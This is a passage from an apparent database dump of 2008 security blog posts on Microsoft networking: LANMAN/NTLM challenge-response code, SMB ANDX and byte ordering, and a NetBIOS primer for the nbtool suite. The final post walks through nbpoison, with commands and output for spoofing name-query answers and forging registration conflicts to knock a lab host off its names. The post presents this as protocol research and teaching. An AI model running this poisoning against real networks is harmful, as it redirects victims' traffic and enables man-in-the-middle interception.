\nChallenge/response\nOnce the LANMAN and NTLM hashes have been calculated, they can\'t just be put on the wire. That would be vulnerable to any number of attacks, the most obvious being replay. If an attacker captures one login, he or she can replay it any time to log in as that user. To prevent that, the server sends 8 bytes of random value, which I call a \"challenge\", to the client. It hashes the hashes using that challenge value to create a response. \nThe code for creating a challenge is almost identical to the code for creating the LANMAN hash, except instead of two parts, it has three. The procedure is identical for hashing a LANMAN or NTLM hash:\n\nPad the 16-byte hash with NULLs (\'\\0\') to 21 bytes\nSplit the 21-byte string into three 7-byte (56-bit) strings\nConvert each of those strings into a 64-bit DES key, by adding a parity bit to the end of each byte (same code as before)\nEncrypt the 8-byte challenge sent by the server with each of the keys, generating three 8-byte encrypted strings\nConcatenate those three strings to form a single 24-byte string\n\nAnd that 24-byte string is what\'s put on the wire. Simple, eh?\nHere\'s some code:\n\r\nvoid lm_create_response(const uint8_t lanman[16], const uint8_t challenge[8], uint8_t result[24])\r\n{\r\n    size_t i;\r\n\r\n    uint8_t password1[7];\r\n    uint8_t password2[7];\r\n    uint8_t password3[7];\r\n\r\n    uint8_t hash1[8];\r\n    uint8_t hash2[8];\r\n    uint8_t hash3[8];\r\n\r\n    /* Initialize passwords. */\r\n    memset(password1, 0, 7);\r\n    memset(password2, 0, 7);\r\n    memset(password3, 0, 7);\r\n\r\n    /* Copy data over. */\r\n    for(i = 0; i < 7; i++)\r\n    {\r\n        password1[i] = lanman[i];\r\n        password2[i] = lanman[i + 7];\r\n        password3[i] = (i + 14 < 16) ? lanman[i + 14] : 0;\r\n    }\r\n\r\n    /* do the encryption. */\r\n    des(password1, challenge, hash1);\r\n    des(password2, challenge, hash2);\r\n    des(password3, challenge, hash3); \r\n\r\n    /* Copy the result to the return parameter. */\r\n    memcpy(result + 0,  hash1, 8);\r\n    memcpy(result + 8,  hash2, 8);\r\n    memcpy(result + 16, hash3, 8);\r\n}\r\n\nThat\'s all you need! \nConclusion\nHopefully you now see how simple it is to create LANMAN/NTLM hashes. There\'s really nothing to it, when it comes right down to it. \nUpdate [2008-11-27]: Noted that LANMAN passwords were converted to uppercase before being hashed.', '\'NetBIOS/SMB\'', 'https://blog.skullsecurity.org/2008/lanman-and-ntlm-not-as-complex-as-you-think');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (124, 'ANDX… and what?', 'Ron Bowes', '2008-8-28', 'My current project, as you can see by my last post, is to learn how to work in Microsoft\'s networking protocols (NetBIOS, SMB, CIFS, etc). This is obviously difficult due to the lack of standards and documentation, but there are two things that are seriously making my life difficult:\n\n\nANDX, and\nByte ordering\n\nThis is all old news if you know your way around SMB/CIFS, but for those who don\'t, this offers a little insight into the twisted world of 1980s coding. \nANDX\nANDX is, at the core, a way of compounding multiple requests into a single request. What that means is a client can send both a \"create session\" request and a \"connect to tree\" request in the same packet, which saves a little bit of bandwidth (the SMB header is 32 bytes, the NetBIOS header is 4 bytes, and TCP/IP adds its own stuff to each packet; that isn\'t much by today\'s standards, but we have to remember that this was invented a long time ago). Now, this seems like a good idea, but it had one fatal mistake: it was added afterwards (or, at least, as an afterthought). \nI count a total of eight message that support ANDX:\n\nSMB_COM_LOCKING_ANDX\nSMB_COM_OPEN_ANDX\nSMB_COM_READ_ANDX\nSMB_COM_WRITE_ANDX\nSMB_COM_SESSION_SETUP_ANDX\nSMB_COM_LOGOFF_ANDX\nSMB_COM_TREE_CONNECT_ANDX\nSMB_COM_NT_CREATE_ANDX\n\nSo those messages have 32-bits of ANDX data prepended to them:\n\n[8 bits] Next message type\n[8 bits] Reserved\n[16 bits] Offset of next ANDX\n\nThe funniest thing is the \"Next message type\" field stored at the top of each message. You end up with packets that look like this:\nSMB Packet\r\n{\r\n    Header\r\n    {\r\n        ...\r\n        type = TYPE1_ANDX;\r\n        ...\r\n    }\r\n    Message1\r\n    {\r\n        type = TYPE2;\r\n        offset = [offset];\r\n        ...\r\n    }\r\n    Message2\r\n    {\r\n        type = 0xFF; [no further commands]\r\n        ...\r\n    }\r\n}\nThis gets incredibly confusing, because \'Message1\', of \'TYPE1\', starts with \'type = TYPE2\'. \nThe other part that really got me is having to put the offset of the next section at the top of the current section. Since I build packets linearly, I don\'t even know that information, which means I\'d have to go back, find the right point, and stick the offset in after the message is built. Luckily, ANDX is entirely optional for client software so I don\'t need to worry about that. When I implement the server, though, I\'m sure all kinds of things will break! \nByte Ordering\nByte ordering normally isn\'t so bad, once you get over the fact that 0x1234 is stored as 34 12 on most systems. NetBIOS/SMB, however, takes the cake. \nNetBIOS specifies that all packets must be in network byte order, or big endian. That\'s cool, that\'s what I\'d expect from the network. \nSMB specifies that all packets must be in little endian. That\'s cool too, I\'m used to servers (like Battle.net) preferring little endian. \nWhat gets me, however, is that NetBIOS is used in the same packets as SMB, so you end up with mixed endianness in a single packet! The NetBIOS header that\'s prepended to SMB requests is basically a 4-byte value: one \'reserved\' byte set to 0x00, then the length in big endian. So you end up with this:\npacket\r\n{\r\n    <big endian> length\r\n    <little endian> data\r\n}\nMaybe this isn\'t a big deal to some, but this type of thing makes me go crazy! \nConclusion\nYou might be wondering what the point of this post was. There wasn\'t any, unless you count me wanting to give readers a bit of insight into how all this behind-the-scenes stuff works. :)\nRon', '\'NetBIOS/SMB\'', 'https://blog.skullsecurity.org/2008/andx-and-what');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (125, 'nbtool 0.02 released! (also, a primer on NetBIOS)', 'Ron Bowes', '2008-8-25', 'All right, maybe 0.02 doesn\'t sound so impressive, but I\'ve put a lot of work into it so eh?\nAnyway, I just finished putting together nbtool 0.02. It is partly a test program for myself, and partly a handy tool for probing NetBIOS networks. Here is a link to the tool itself (I\'ve tested this on Linux, OS X (ppc + intel), iPhones, and Windows (cygwin)):\nhttp://www.skullsecurity.org/wiki/index.php/Nbtool\n\nTo actually understand what this tool is doing, I\'m going to go over a high-level view of what the NetBIOS protocol is, and how it works, and how each of the four programs that come with nbtool 0.02 leverage it. If you want a more complete understanding, I highly recommend Implementing CIFS.\nI highly recommend following along with the nbtool program. All you need is a network with a couple unfirewalled Windows systems. I suggest using VMWare.\nAt the simplest level, which is the level I\'ve implemented in nbtool, NetBIOS is a way for multiple computers within a broadcast domain to find and talk to each other. They find each other based on names, and talk to each other with either UDP (datagram service) or TCP (session service) packets. That\'s it! There are also modes where NetBIOS queries can be routed, but I\'m not going to get into that (I\'m talking about \'b\' or \'broadcast\' mode, not \'p\' or \'point-to-pont\' mode).\nRegistration\nWhen you turn on a Windows system, it will \'register\' its name by broadcasting a NetBIOS Registration packet. If somebody else is already using that name, they will reply with an error message (\"Active\", aka, a \"Conflict\"). This tells the new system that there is a conflict with its name, so it is disabled. Occasionally, it will broadcast a NetBIOS Refresh, to ensure that everybody still knows it exists. Finally, when it\'s shut down, it will broadcast a NetBIOS Release packet. These packets all happen on UDP port 137, and are very easy to provoke (just reboot), so I won\'t post any packet captures. Just grab Wireshark and reboot a Windows box on the same network as yourself, and there you go.\nOn a sidenote, there are two types of names: unique and group. A unique name is typically the name of the computer itself, and nobody else can have it. For example, my test systems are named \'TEST1\' and \'TEST2\'. A group name can be shared by multiple machines, but nobody is allowed to grab it as a unique name. The default group name on Windows is \'WORKGROUP\'.\nThis brings us to the nbregister program, which sends out any of those registration-related packets:\nUsage: ./nbregister -t  -s  [-d ] -n [:] [-g] [-p listenport]\nHere is an example of trying to register, refresh, and release a unique name that already exists:\n$ ./nbregister -t register -n \'TEST1\'\r\nANSWER name registration: (NB:TEST1    <00|workstation>): Status: error: active; IP: 192.168.1.41, TTL: 0s\r\n$ ./nbregister -t refresh -n \'TEST1\'\r\n$ ./nbregister -t release -n \'TEST1\'\nNotice that the \'register\' request provoked a conflict response from 192.168.1.41, saying that the name is already active, as expected. There was no answer to the \'refresh\' or \'release\' queries, however.\nWe can use the \'-g\' flag to indicate that we\'re joining a group, as seen here:\n$ ./nbregister -t register -n \'WORKGROUP\' -g\nNotice that no errors are returned -- the test boxes are fine with me joining their workgroup. However, if I try to take the name \'WORKGROUP\' as a unique user, they get upset:\n$ ./nbregister -t register -n \'WORKGROUP\'\r\nANSWER name registration: (NB:WORKGROUP      <00|workstation>): Status: error: active; IP: 192.168.1.42, TTL: 0s\r\nANSWER name registration: (NB:WORKGROUP      <00|workstation>): Status: error: active; IP: 192.168.1.41, TTL: 0s\nBoth 192.168.1.41 and 192.168.1.42 are members of \'WORKGROUP\', and they both send back a conflict when I attempt to take that as a name.\nQueries\nSo, now we see how systems register themselves on a network. But what happens when they want to find each other?\nThe answer to that is, they broadcast a request saying, \"who is xxx?\", and the system with that name, if it exists, responds saying, \"that\'s me!\". You can even be more general and say, \"who is out there?\", which every system is supposed to respond to. I wrote a little utility to do this called nbquery, although there are definitely other better ones out there.\nLet\'s dive straight into examples. On the first one, we\'re going to ask, \"who has TEST1\" and \"who has TEST2\"?\n$ ./nbquery -n \'TEST1\'\r\nANSWER query: (NB:TEST1    <00|workstation>): Status: success; IP: 192.168.1.41, TTL: 300000s\r\n$ ./nbquery -n \'TEST2\'\r\nANSWER query: (NB:TEST2    <00|workstation>): Status: success; IP: 192.168.1.42, TTL: 300000s\nThe boxes both answer to their own name. If we want to find all the boxes on the network, we can specify a wildcard (or leave off the \'-n\' parameter all together):\n$ ./nbquery -n \'*\'\r\nANSWER query: (NB:*<00|workstation>): Status: success; IP: 192.168.1.41, TTL: 300000s\r\nANSWER query: (NB:*<00|workstation>): Status: success; IP: 192.168.1.42, TTL: 300000s\nThey both answered that request. Now, if you want to dig deeper, you can ask a machine to provide information about itself (Microsoft\'s nbtstat program does this, as well as the opensource nbtscan):\n$ ./nbquery -n \'*\' -d \'192.168.1.41\' -t NBSTAT\r\nNBSTAT response: recieved 8 names:\r\nANSWER query: (NBSTAT:*<00|workstation>): Status: success; TEST1      <00|workstation>\r\nANSWER query: (NBSTAT:*<00|workstation>): Status: success; TEST1      <20|server>\r\nANSWER query: (NBSTAT:*<00|workstation>): Status: success; WORKGROUP  <00|workstation>\r\nANSWER query: (NBSTAT:*<00|workstation>): Status: success; TEST1      <03|messenger>\r\nANSWER query: (NBSTAT:*<00|workstation>): Status: success; WORKGROUP  <1e|election>\r\nANSWER query: (NBSTAT:*<00|workstation>): Status: success; RON        <03|messenger>\r\nANSWER query: (NBSTAT:*<00|workstation>): Status: success; WORKGROUP  <1d|unknown>\r\nANSWER query: (NBSTAT:*<00|workstation>): Status: success; __MSBROWSE__<01|unknown>\r\n * Additional data: 00 0c 29 f9 d9 28 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\r\n                    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\nThis returned all eight names owned by the box, including the computer\'s name (\'TEST1\'), the workgroup (\'WORKGROUP\'), the logged-in user (\'RON\'), and the special name whose meaning I don\'t understand yet (\'\\x01\\x02__MSBROWSER__\\x02\\x01\'). Additionally, it returned additional data. It\'s mostly 00s, but note the first 6 bytes -- Windows puts the box\'s MAC address there, while Samba leaves it blank.\nSniffing\nSo, if you\'re still with me, it means I\'m not as bad at explaining as I thought! Basically, that\'s the way NetBIOS registers and queries names. So, the first thing a hacker should think of is, what can I do with this?\nWell, first off, the boring one: nbsniff. All this does is display the NetBIOS traffic it sees. Here is an example of it running while rebooting \'TEST2\':\n$ sudo ./nbsniff\r\nQUESTION name release: (NB:TEST2           <20|server>)\r\nADDITIONAL name release: (NB:TEST2          <20|server>): IP: 192.168.1.42, TTL: 0s\r\nQUESTION name release: (NB:TEST2          <03|messenger>)\r\nADDITIONAL name release: (NB:TEST2          <03|messenger>): IP: 192.168.1.42, TTL: 0s\r\nQUESTION name release: (NB:WORKGROUP      <1e|election>)\r\nADDITIONAL name release: (NB:WORKGROUP      <1e|election>): IP: 192.168.1.42, TTL: 0s\r\nQUESTION name release: (NB:WORKGROUP      <00|workstation>)\r\nADDITIONAL name release: (NB:WORKGROUP      <00|workstation>): IP: 192.168.1.42, TTL: 0s\r\nQUESTION name release: (NB:TEST2          <00|workstation>)\r\nADDITIONAL name release: (NB:TEST2          <00|workstation>): IP: 192.168.1.42, TTL: 0s\r\nQUESTION name registration: (NB:TEST2          <00|workstation>)\r\nADDITIONAL name registration: (NB:TEST2          <00|workstation>): IP: 192.168.1.42, TTL: 300000s\r\nQUESTION name registration: (NB:TEST2           <20|server>)\r\nADDITIONAL name registration: (NB:TEST2          <20|server>): IP: 192.168.1.42, TTL: 300000s\r\nQUESTION name registration: (NB:TEST2          <00|workstation>)\r\nADDITIONAL name registration: (NB:TEST2          <00|workstation>): IP: 192.168.1.42, TTL: 300000s\r\nQUESTION name registration: (NB:TEST2           <20|server>)\r\nADDITIONAL name registration: (NB:TEST2          <20|server>): IP: 192.168.1.42, TTL: 300000s\r\nQUESTION name registration: (NB:TEST2          <00|workstation>)\r\nADDITIONAL name registration: (NB:TEST2          <00|workstation>): IP: 192.168.1.42, TTL: 300000s\r\nQUESTION name registration: (NB:TEST2           <20|server>)\r\nADDITIONAL name registration: (NB:TEST2          <20|server>): IP: 192.168.1.42, TTL: 300000s\r\nQUESTION name registration: (NB:TEST2          <00|workstation>)\r\nADDITIONAL name registration: (NB:TEST2          <00|workstation>): IP: 192.168.1.42, TTL: 300000s\r\nQUESTION name registration: (NB:TEST2           <20|server>)\r\nADDITIONAL name registration: (NB:TEST2          <20|server>): IP: 192.168.1.42, TTL: 300000s\r\nQUESTION name registration: (NB:WORKGROUP      <00|workstation>)\r\nADDITIONAL name registration: (NB:WORKGROUP      <00|workstation>): IP: 192.168.1.42, TTL: 300000s\r\nQUESTION name registration: (NB:WORKGROUP      <00|workstation>)\r\nADDITIONAL name registration: (NB:WORKGROUP      <00|workstation>): IP: 192.168.1.42, TTL: 300000s\r\nQUESTION name registration: (NB:WORKGROUP      <00|workstation>)\r\nADDITIONAL name registration: (NB:WORKGROUP      <00|workstation>): IP: 192.168.1.42, TTL: 300000s\r\nQUESTION name registration: (NB:WORKGROUP      <00|workstation>)\r\nADDITIONAL name registration: (NB:WORKGROUP      <00|workstation>): IP: 192.168.1.42, TTL: 300000s\r\nQUESTION name registration: (NB:WORKGROUP      <1e|election>)\r\nADDITIONAL name registration: (NB:WORKGROUP      <1e|election>): IP: 192.168.1.42, TTL: 300000s\r\nQUESTION name registration: (NB:TEST2          <03|messenger>)\r\nADDITIONAL name registration: (NB:TEST2          <03|messenger>): IP: 192.168.1.42, TTL: 300000s\r\nQUESTION name registration: (NB:WORKGROUP      <1e|election>)\r\nADDITIONAL name registration: (NB:WORKGROUP      <1e|election>): IP: 192.168.1.42, TTL: 300000s\r\nQUESTION name registration: (NB:TEST2          <03|messenger>)\r\nADDITIONAL name registration: (NB:TEST2          <03|messenger>): IP: 192.168.1.42, TTL: 300000s\r\nQUESTION name registration: (NB:WORKGROUP      <1e|election>)\r\nADDITIONAL name registration: (NB:WORKGROUP      <1e|election>): IP: 192.168.1.42, TTL: 300000s\r\nQUESTION name registration: (NB:TEST2          <03|messenger>)\r\nADDITIONAL name registration: (NB:TEST2          <03|messenger>): IP: 192.168.1.42, TTL: 300000s\r\nQUESTION name registration: (NB:WORKGROUP      <1e|election>)\r\nADDITIONAL name registration: (NB:WORKGROUP      <1e|election>): IP: 192.168.1.42, TTL: 300000s\r\nQUESTION name registration: (NB:TEST2          <03|messenger>)\r\nADDITIONAL name registration: (NB:TEST2          <03|messenger>): IP: 192.168.1.42, TTL: 300000s\nNotice how it sends a bunch of \'release\' broadcasts when it shuts down, then a bunch of \'register\' broadcasts when it starts up, just as expected. Also note what a chatty protocol it is. All that traffic?\nAnd here is a NetBIOS query from TEST1:\nQUESTION query: (NB:DEMO           <00|workstation>)\r\nQUESTION query: (NB:DEMO           <00|workstation>)\r\nQUESTION query: (NB:DEMO           <00|workstation>)\nNice and simple!\nBut anyway, since we\'re seeing all the broadcasts, what\'s stopping us from answering them?\nPoisoning\nAnd that brings me to the final tool in the nbtool package: nbpoison. nbpoison will answer all NetBIOS queries with a chosen IP address. This includes:\n\nComputers on the LAN that aren\'t found\nDomains under 14 characters that can\'t be resolved by DNS (ie, mistyped URLs)\nComputers on the LAN that ARE found, sometimes (it\'s a race, sometimes)\n\nHere is an example of poisoning a local address:\n$ sudo ./nbpoison -s 1.2.3.4\r\nQUESTION query: (NB:DEMO           <00|workstation>)\r\n(returning response with \'1.2.3.4\')\nAnd here\'s the victim machine:\nC:\\Documents and Settings\\Ron>ping DEMO\r\n\r\nPinging DEMO [1.2.3.4] with 32 bytes of data:\r\n\r\nRequest timed out.\r\nRequest timed out.\r\nRequest timed out.\r\nRequest timed out.\r\n\r\nPing statistics for 1.2.3.4:\r\n    Packets: Sent = 4, Received = 0, Lost = 4 (100% loss),\r\nApproximate round trip times in milli-seconds:\r\n    Minimum = 0ms, Maximum =  0ms, Average =  0ms\nNotice that it resolved to my chosen IP!\nHere\'s what the packet capture looks like:\n192.168.1.41 -> 192.168.1.255	NBNS	Name query NB DEMO<00>\r\n192.168.1.2 -> 192.168.1.41	NBNS	Name query response NB 1.2.3.4\nNothing complicated there -- It asks who has DEMO, and I respond saying, \"1.2.3.4 does\".\nWhere it gets a little more complicated is when you race another machine. Recall that my boxes are called TEST1 and TEST2. What happens when TEST2 tries to ping TEST1?\n192.168.1.42 -> 192.168.1.255	NBNS	Name query NB TEST1<00>\r\n192.168.1.41 -> 192.168.1.42	NBNS	Name query response NB 192.168.1.41\r\n192.168.1.2 -> 192.168.1.42	NBNS	Name query response NB 1.2.3.4\nIn this case, TEST2 asks where to find TEST1, and gets two responses: one from TEST1, and one from me. Unfortunately, mine was second, so TEST2 gets the proper address and connects to the proper host.\nObviously, in an attack scenario, this isn\'t ideal. So, what can we do?\nRecall a long time ago (at least, it feels like a long time ago when I\'m typing...), I talked about sending a \'Conflict\' packet to tell a system its name is already in use. So why don\'t we send a conflict ourselves?\nTo do this, we run nbpoison with the \'-c\' (or \'conflict\') switch. This tells it to actively send out conflicts (I left it off by default because it can seriously break things). When that\'s enabled, it\'ll respond to every registration with a \'conflict\'. Observe:\n$ sudo ./nbpoison -s 1.2.3.4 -c\r\nQUESTION name registration: (NB:TEST1    <00|workstation>)\r\n(returning registration conflict)\r\nADDITIONAL name registration: (NB:TEST1    <00|workstation>): IP: 192.168.1.41, TTL: 300000s\r\nQUESTION name registration: (NB:TEST1     <20|server>)\r\n(returning registration conflict)\r\nADDITIONAL name registration: (NB:TEST1    <20|server>): IP: 192.168.1.41, TTL: 300000s\r\nQUESTION name registration: (NB:TEST1    <03|messenger>)\r\n(returning registration conflict)\r\nADDITIONAL name registration: (NB:TEST1    <03|messenger>): IP: 192.168.1.41, TTL: 300000s\nAnd the first couple packets:\n192.168.1.41 -> 192.168.1.255	NBNS	Registration NB TEST1<00>\r\n192.168.1.2 -> 192.168.1.41	NBNS	Registration response, Name is owned by another node NB 1.2.3.4\r\n192.168.1.41 -> 192.168.1.255	NBNS	Registration NB TEST1<20>\r\n192.168.1.2 ->192.168.1.41	NBNS	Registration response, Name is owned by another node NB 1.2.3.4\r\n...\nAs a result, if we ask TEST1 for its list of names, it won\'t have any:\n$ sudo ./nbquery -d \'192.168.1.41\' -t NBSTAT\r\nNBSTAT response: recieved 0 names:\r\n(did you poison it with conflicts?)\r\n * Additional data: 00 0c 29 f9 d9 28 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\r\n                    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\nNow that TEST1 has been poisoned, TEST2 will always end up at our chosen server:\nC:\\Documents and Settings\\Ron>ping TEST1\r\n\r\nPinging TEST1 [1.2.3.4] with 32 bytes of data:\r\n...\nConclusion\nHopefully you\'ve taken away a little bit of information about how NetBIOS names work. My tools in their current state obviously don\'t do a whole lot, but I envision comining them to perform man-in-the-middle attacks against systems, but that\'ll be in the future. Stay tuned!\nRon', '\'NetBIOS/SMB\', \'Tools\'', 'https://blog.skullsecurity.org/2008/nbtool-002-released-also-a-primer-on-netbios');
